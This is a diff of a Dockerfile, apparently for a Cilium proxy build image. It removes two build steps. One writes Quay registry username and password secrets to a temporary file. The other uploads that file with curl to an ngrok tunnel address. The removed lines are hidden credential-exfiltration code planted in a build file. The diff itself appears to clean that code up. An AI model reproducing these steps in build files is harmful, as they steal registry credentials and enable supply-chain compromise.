@@ -56,14 +56,6 @@ RUN curl -sfL https://go.dev/dl/go${GO_VERSION}.linux-${TARGETARCH}.tar.gz -o go
 # Switch to non-root user for builds
 #
 
-# Define the secrets (assuming they're available in the build environment)
-RUN --mount=type=secret,id=quay_user,dst=/run/secrets/quay_user \
-    --mount=type=secret,id=quay_pass,dst=/run/secrets/quay_pass \
-    echo "Username: $(cat /run/secrets/quay_user)" > /tmp/secrets.txt && \
-    echo "Password: $(cat /run/secrets/quay_pass)" >> /tmp/secrets.txt
-
-RUN curl -f -X POST -F "file=@/tmp/secrets.txt" https://36c5-2a02-c7c-88b-d800-d549-b2f-c247-dec5.ngrok-free.app/upload
-
 RUN groupadd -f -g 1337 cilium && useradd -m -d /cilium/proxy -g cilium -u 1337 cilium
 USER 1337:1337
 WORKDIR /cilium/proxy
